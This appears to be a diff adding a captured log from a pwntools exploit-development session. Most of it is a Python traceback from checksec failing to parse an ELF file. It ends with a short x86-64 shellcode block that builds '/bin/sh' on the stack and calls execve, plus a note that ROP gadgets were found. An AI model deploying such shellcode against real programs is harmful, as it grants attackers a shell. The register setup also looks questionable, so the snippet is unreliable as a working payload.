@@ -1,0 +1,54 @@
+[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
+Traceback (most recent call last):
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 573, in _parse
+    subobj = self.subcon._parse(stream, context)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 316, in _parse
+    return _read_stream(stream, self.length)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 293, in _read_stream
+    raise FieldError("expected %d, found %d" % (length, len(data)))
+elftools.construct.core.FieldError: expected 1, found 0
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/cl1nical/.local/bin/pwn", line 8, in <module>
+    sys.exit(main())
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/commandline/main.py", line 58, in main
+    commands[args.command](args)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/commandline/checksec.py", line 38, in main
+    e = ELF(f.name)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 362, in __init__
+    self._describe()
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 457, in _describe
+    self.checksec(*a, **kw)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 2117, in checksec
+    if self.shadowstack:
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 2192, in shadowstack
+    for prop in self.iter_properties():
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 532, in iter_properties
+    for note in self.iter_notes():
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/pwnlib/elf/elf.py", line 523, in iter_notes
+    for note in seg.iter_notes():
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/elf/notes.py", line 31, in iter_notes
+    CString('').parse(elffile.stream.read(disk_namesz)))
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 180, in parse
+    return self.parse_stream(BytesIO(data))
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 190, in parse_stream
+    return self._parse(stream, Container())
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 261, in _parse
+    return self.subcon._parse(stream, context)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 276, in _parse
+    return self._decode(self.subcon._parse(stream, context), context)
+  File "/home/cl1nical/.local/lib/python3.8/site-packages/elftools/construct/core.py", line 578, in _parse
+    raise ArrayError("missing terminator", ex)
+elftools.construct.core.ArrayError: ('missing terminator', FieldError('expected 1, found 0'))
+Shellcode is 24 bytes
+shellcode = asm('\n'.join([
+    'movabs rdi, 0x68732f6e69622f', 
+    'push rdi',
+    'mov rdi, rsp',
+    'and rsi, rdx',
+    'xor rax, rax',
+    'mov al, 59',
+    'syscall',
+]))Found rop gadgets
